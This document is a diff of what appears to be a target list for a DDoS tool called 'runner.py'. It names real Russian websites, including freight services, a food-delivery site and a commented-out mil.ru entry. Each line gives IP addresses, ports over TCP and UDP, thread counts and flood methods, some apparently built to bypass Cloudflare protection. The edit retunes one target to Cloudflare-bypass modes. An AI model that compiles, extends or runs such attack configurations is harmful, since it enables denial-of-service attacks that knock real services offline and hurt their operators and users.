@@ -14,14 +14,15 @@
 
 
 ###Везёт всем - онлайн-сервис по грузоперевозкам.
-#runner.py https://vezetvsem.ru/ https://frontend.vezetvsem.ru/ 89.108.106.50:80 89.108.106.50:443 https://89.108.106.50:443 tcp://89.108.106.50:22 tcp://89.108.106.50:80 tcp://89.108.106.50:443 -t 2000 --http-methods get stress head bypass
+https://vezetvsem.ru/ https://frontend.vezetvsem.ru/ 89.108.106.50:80 89.108.106.50:443 https://89.108.106.50:443 tcp://89.108.106.50:22 tcp://89.108.106.50:80 tcp://89.108.106.50:443 -t 2000 --http-methods cfb cfbuam
 
 https://ekdostavka.ru http://ekdostavka.ru 94.250.254.110:80 94.250.254.110:443 https://94.250.254.110:443 udp://94.250.254.110:53 tcp://94.250.254.110:21 tcp://94.250.254.110:22 tcp://94.250.254.110:80 tcp://94.250.254.110:443 tcp://94.250.254.110:53  -t 3000 --http-methods stress get head
 
 https://cargocash.ru/ http://cargocash.ru/ http://188.225.36.11:443 tcp://188.225.36.11:443 -t 1000 --http-methods stress cfb
 
-https://mil.ru http://mil.ru 87.242.66.56:80 87.242.66.56:443 https://87.242.66.56:443 tcp://87.242.66.56:443 tcp://87.242.66.56:80 -t 1000 --http-methods bypass get stress
 
+
+#https://mil.ru http://mil.ru 87.242.66.56:80 87.242.66.56:443 https://87.242.66.56:443 tcp://87.242.66.56:443 tcp://87.242.66.56:80 -t 1000 --http-methods bypass get stress
 
 #runner.py https://broniboy.ru https://broniboy.ru/samara/restaurants/ 185.137.235.138:80 185.137.235.138:443 https://185.137.235.138:443 https://185.137.235.138:8433 tcp://185.137.235.138:22 tcp://185.137.235.138:53 tcp://185.137.235.138:80 tcp://185.137.235.138:443 -t 1000 --http-methods stress get head
 
